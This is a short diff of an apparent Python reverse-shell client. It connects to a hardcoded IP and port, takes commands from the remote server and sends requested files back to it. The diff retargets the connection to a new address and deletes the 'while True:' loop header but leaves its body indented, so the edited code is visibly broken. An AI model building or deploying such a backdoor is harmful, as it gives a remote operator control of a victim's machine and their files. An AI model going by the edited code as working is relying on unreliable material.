@@ -20,12 +20,11 @@ def transfer(s, path):
     else:
         s.send('FILE NOT FOUND'.encode())
 
-#function which initiates the connection to the server
+
 def connecting():
     s = socket.socket()
-    s.connect(("192.168.0.105", 8080))
+    s.connect(("192.168.49.89", 8003))
 
-    while True:
         command = s.recv(8192)
         if 'exit' in command.decode():
             s.close()
@@ -55,3 +54,4 @@ def main():
 
 #finally running the main function to start the server!
 main()
+
